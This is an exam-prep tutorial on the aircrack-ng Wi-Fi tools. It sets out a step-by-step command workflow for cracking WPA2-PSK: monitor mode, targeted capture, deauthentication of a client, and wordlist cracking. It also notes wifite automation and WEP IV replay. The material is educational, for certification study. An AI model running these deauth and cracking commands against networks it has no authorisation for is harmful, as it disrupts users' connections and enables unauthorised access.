# Tutorial: aircrack-ng suite — Wi-Fi cracking

**What it is:** four tools, each with one job. Exams love asking you to name which tool does what:

| Tool | Job |
|------|-----|
| `airmon-ng` | put the Wi-Fi card in **monitor mode** |
| `airodump-ng` | **capture** traffic / spot APs + clients |
| `aireplay-ng` | **inject** packets (deauth a client) |
| `aircrack-ng` | **crack** the captured handshake |

Quick-start workflow (WPA2-PSK):
```bash
# 0. Monitor mode (ALWAYS first)
sudo airmon-ng check kill
sudo airmon-ng start wlan0            # creates wlan0mon

# 1. See what's in the air
sudo airodump-ng wlan0mon             # note BSSID, channel, clients

# 2. Lock onto the target AP
sudo airodump-ng wlan0mon --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture

# 3. Force a client to reconnect (captures the 4-way handshake)
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
#    (look for "WPA handshake: XX:XX..." in airodump's top-left corner)

# 4. Crack it
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

Or automate all of it: `sudo wifite` (picks targets, deauths, cracks — answers the "which command does everything" question).

## Facts exams test
- **Monitor mode first** — managed mode can't capture handshakes.
- `-c` channel must **match the AP's channel** or you see nothing.
- Handshake = **4 EAPOL packets**; you need messages **1–2 or 2–3** to crack.
- **WPA/WPA2-PSK** = handshake + wordlist. **WEP** = collect IVs (`aireplay-ng --arpreplay`), cracks without a wordlist. **WPA2-EAP (enterprise)** = not crackable this way.
- `aircrack-ng` alone doesn't capture anything — the suite does.

## Gotchas
- After `airmon-ng check kill`, your Wi-Fi internet dies until `sudo service network-manager restart`.
- Cracking fails with "no valid WPA handshakes found" → re-run the deauth; the handshake may have been missed.
- Newer Kali names the monitor interface `wlan0mon`; some just rename `wlan0`.

**Deep dive:** [04-network-traffic-wireless.md](../04-network-traffic-wireless.md)

← [Back to index](../README.md)
